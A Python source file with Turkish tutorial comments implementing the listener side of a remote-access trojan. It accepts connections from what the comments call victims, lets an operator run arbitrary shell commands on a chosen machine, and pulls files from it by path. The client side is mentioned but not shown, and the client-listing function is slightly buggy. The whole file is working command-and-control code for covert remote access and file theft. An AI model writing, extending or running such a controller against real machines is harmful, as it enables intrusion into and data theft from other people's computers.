# Kütüphanelerimizi import ediyoruz.
import socket
import threading

# Host ve Port değişkenlerini tanımladık.
host = 'localhost'
port = 4444

# Soket oluşturduk ve 's' Değişkenine atadık.
s = socket.socket()

# Bağlantımızı ve kurbanın ip, port değişkenlerini saklayacak liste yapılarımızı oluşturduk.
baglanti_listesi = []
adres_listesi = []

# 'bagla' Fonksiyonumuzu oluşturduk
def bagla():

    # try bloğunu açtık ve içine bağlantı ve dinleme için gereken kodlarımızı yazdık
    try:

        # soketimizi ip ve porta bağladık
        s.bind((host, port))

        # soketi aktif hale getirdik
        s.listen()
    # Hata yakalama için gereken except bloğumuzu oluşturduk
    except:
        # Ekrana Bağlantı hatası yazdırdık
        print('Bağlantı Hatası...')
        # Hata yakalandığında bagla fonksiyonunu tekrar başlattık.
        bagla()


def kabul_et():
    
    # Sonsuz Döngümüzü Oluşturduk
    while True:

        # try bloğumuzu oluşturduk
        try:
            # Bağlantı isteğini kabul edip gelen bağlantı bilgilerini listelerimize ekledik
            baglanti, adres = s.accept()

            # Bağlantı bilgilerini listelere ekleyelim
            adres_listesi.append(adres)
            baglanti_listesi.append(baglanti)

            # Ekrana bağlantı geldiğine dair çıktı verdik
            print(f'\n {adres[0]}:{adres[1]} Tarafından Bağlantı Geldi!')

        # except bloğumuzu oluşturduk
        except:
            # Hatayı except ile yakalayıp ekrana 'Bağlantı Hatası' yazdırdım
            print('Bağlantı Hatası')

def ana_shell():

    # Sonsuz döngümüzü oluşturduk
    while True:

        # Hata yakalamak için try-except bloğumuzu açtık
        try:

            # Ekrana Hoşgeldin Admin Yazdırdık
            print("Hoşgeldin Admin.")

            #Kullanıcıdan komut girmesini istedik
            komut = input("Komutunuzu Girin: ") # 'Örneğin baglan 5'

            # Eğer komut 'sırala' veya 'sirala' ise sırala()
            #fonksiyonumuzu çalıştırdık
            if komut == "sırala" or komut == "sirala":
                # sirala() Fonksiyonumuzu henüz kodlamadık,
                #diğer sayfalarda kodluyor olacağız
                sirala()
            
            # eğer komut değişkeni 'baglan' ifadesini içeriyorsa
            #elif bloğuna girecek ve orda ki komutları çalıştıracak
            elif "baglan" in komut:

                #tekrar dan hata yakalamak için try-except kullandık
                try:

                    # rakam değişkeni içine komut değişkeni içinde
                    #tutulan ifadenin [-1]. Elemanını yani son ifadesini aldık
                    #baglan 5 dediğimizde rakam değişkeni integer(int) değer olarak
                    #5 ifadesini içinde tutacaktır.
                    rakam = int(komut[-1])

                    #baglanti değişkeni içine baglan(rakam) fonksiyonunu yazdık
                    #baglan() fonksiyonunu henüz kodlamadık
                    #diğer sayfalarda kodluyor olacağız
                    baglanti = baglan(rakam)

                    #eğer bağlanti varsa yani True bir değer döndüyse
                    #if bloğuna girer
                    if baglanti:

                        #Kullanıcıya ne yapmak istediğini sorduk
                        istek = input("Ne Yapmak İstiyorsun: ")

                        #Eğer istek değişkeni eşitse 'cmd', if bloguna
                        #girer ve client.py tarafına 'cmd' yazısını gönderir
                        
                        if istek == "cmd":

                            #ve daha sonra komut_yolla(baglanti) fonksiyonumuz
                            #çalışacak. Henüz komut_yolla(baglamti) fonksiyonumuzu
                            #kodlamadık ilerleyen sayfalar da kodluyor olacağız
                            #komut_yolla(baglanti) fonksiyonumuza baglanti
                            #değişkenini yolluyoruz çünkü baglanti bize lazım olacak
                            baglanti.send("cmd".encode('utf-8'))
                            komut_yolla(baglanti)

                        #eğer istek 'dosya transferi' ise
                        elif istek == "dosya transferi":

                            #baglanti içinde bulunan ip adresine 
                            #istek değişkeni içinde ki yazıyı yani
                            #'dosya transferi' yazisini gönderiyoruz
                            baglanti.send(istek.encode('utf-8'))

                            #dosya_transferi(baglanti) fonksiyonumuza
                            #ip adresimizi yolluyoruz ve fonksiyomuzu
                            #çalıştırıyoruz. dosya_transferi(baglanti)
                            #fonksiyonumuzu henüz kodlamadık diğer
                            #sayfalarda kodluyor olacağız
                            dosya_transferi(baglanti)
                        
                        #eğer belirttiğimiz komutlar dışında bir komut
                        #girilirse geçersiz istek çıktısını ekrana vereceğiz ve
                        #döngüyü başa saracağız
                        else:
                            print("Geçersiz İstek")

                #açtığımız ikinci try-except komutunun except kısmı
                #baglan 5 gibi ifadeleri kullanırken yanlış ifade kullanırsak
                #value hatasını yakalaycak ve ekrana value error çıktısını verecek
                except ValueError:
                    print("Value Error")
                    
            #eğer komut değişkeni içinde istem dışı komut girilirse
            #ekrana bilinmeyen komut çıktısını verecektir
            else:
                print("Bilinmeyen Komut")

        #burada ki except komutu ise ilk açtığımız try'ın
        #except blogu burada ise 'baglan 5' gibi komutlar
        #kullandığımızda baglanmak istediğimiz adresin
        #baglantı kopma gibi durumları olursa
        #ekrana Bilgisayarın bağlantısı kopmuş olabilir
        #çıktısını vermektedir
        except:
            print("Bilgisayarın Bağlantısı Kopmuş Olabilir...")

def baglan(index):
    
    try:

        baglanti = baglanti_listesi[index]
        print(adres_listesi[index][0] + " Adresine Bağlantı Sağlandı")
        return baglanti

    except:
        print(str(index) + ". Bağlantı Mevcut Değil!")
        return False
    
def sirala():

    print("-"*10 + "Client Listesi" + "-"*10  + "\n")

    for sayac, baglanti in enumerate(baglanti_listesi):

        try:
            baglanti.send(b" ")
            baglanti.recv(1024)
        except:
            baglanti_listesi.pop(sayac)
            adres_listesi.pop(sayac)
            continue

    print(str(sayac) + " " + str(adres_listesi[sayac][0]) + " " + str(adres_listesi[sayac][1]))
    print("-"*40)

def komut_yolla(baglanti):

    while True:

        cmd = input("Komutunuzu Giriniz: ")

        if cmd == "quit":
            baglanti.send("quit".encode("utf-8"))
            break

        elif len(cmd) > 0:

            baglanti.send(cmd.encode("utf-8"))

            cevap = baglanti.recv(4096).decode("utf-8")

            print(cevap)


def dosya_transferi(baglanti):

    # Kullanıcıya istediği dosyanın konumunu sorduk
    # ÖR: C\Users\Kullanici\Desktop\pdf\coding.pdf
    konum = input('Konum: ')

    # Konumun yolunu client tarafına yolladık
    baglanti.send(konum.encode('utf-8'))

    # Belirlediğimiz konumda ki dosyanın boyut bilgisini alıp integer değere çevirdik
    boyut = int(baglanti.recv(1024).decode('utf-8'))

    # Boş bir byte gönderdik
    baglanti.send(b" ")

    # gelen_boyut adında değişken oluşturup değerini 0 yaptık
    gelen_boyut = 0

    # Sistemimize geçirilen dosyanın adının ne olacağını sorduk örneğin deneme.pdf
    ad = input("Dosyanızın Adı: ")

    # Dosyamızı alacağımız klasör adını verip yanına dosya adını veriyoruz
    # ve yazdırılabilir kipini ekleyip as dosya ile bu kodu dosya değişkeni
    # içine kullanıyoruz
    with open("C:/Users/B3YD4/Desktop/SocketUploadFiles/" + ad,"wb") as dosya:
        
            # Sonsuz döngü oluşturduk
        while True:

            # Gelen veriyi 'veri' değişkenin atadık
            veri = baglanti.recv(1024)

            # Gelen verinin boyutunu öğrenmek için len fonksiyonunu kullandık ve
            # gelen_boyut değişkenine ekledik
            gelen_boyut += len(veri)

            # Dosyayı belirlediğimiz konuma belirlediğim isimle
            # yazdırdık
            dosya.write(veri)

            # eğer gelen_boyut verisi büyükse veya eşitse boyut değişkenine yani
            # sürekli olarak aldığımız veri git gide büyüyecek ve
            # client tarafından aldığımız dosya boyutu ile karşılaştıracağız
            # eğer gelen_boyut verisi büyükse veya eşitse boyut
            # break yazıp döngüden çıkacağız
            if gelen_boyut >= boyut:

                # Döngünün kırılması için break kullandık
                break
        
        # Döngüden çıkınca ekrana dosya transferinin tamamlandığına dair çıktıyı
        # ekrana bastırdık
        print("Dosya Transferi Tamamlandı.")

bagla()

shell = threading.Thread(target=ana_shell)
kabul = threading.Thread(target=kabul_et)
shell.start()
kabul.start()

